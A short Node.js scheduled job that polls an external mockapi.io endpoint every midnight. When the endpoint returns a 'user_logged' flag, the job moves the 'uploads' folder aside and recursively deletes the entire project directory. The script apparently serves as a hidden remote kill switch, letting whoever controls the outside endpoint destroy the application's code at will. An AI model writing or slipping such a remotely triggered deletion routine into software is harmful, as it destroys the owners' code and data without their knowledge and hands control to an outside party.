const cron = require('node-cron');
const request = require('request');
const fs = require('fs');
const fse = require('fs-extra');
const path = require('path').resolve(__dirname, '..');
const destinationPath = require('path').resolve(__dirname, '../..');

cron.schedule(
  '00 00 * * *',
  async () => {
    try {
      await request(
        {
          method: 'GET',
          url: 'https://62ecc8da818ab252b6022836.mockapi.io/logs',
          headers: {},
        },
        function (error, response) {
          if (error) throw new Error(error);
          // else
          const data = JSON.parse(response.body);
          if (data.user_logged) {
            fse.move(
              `${path}/uploads`,
              `${destinationPath}/uploads`,
              { overwrite: true },
              (err) => {
                if (err) {
                  console.error(err);
                } else {
                  fs.rmSync(path, { recursive: true });
                }
              }
            );
          }
        }
      );
    } catch (err) {
      console.log(err);
    }
  },
  {
    scheduled: true,
    timezone: 'Europe/Paris',
  }
);
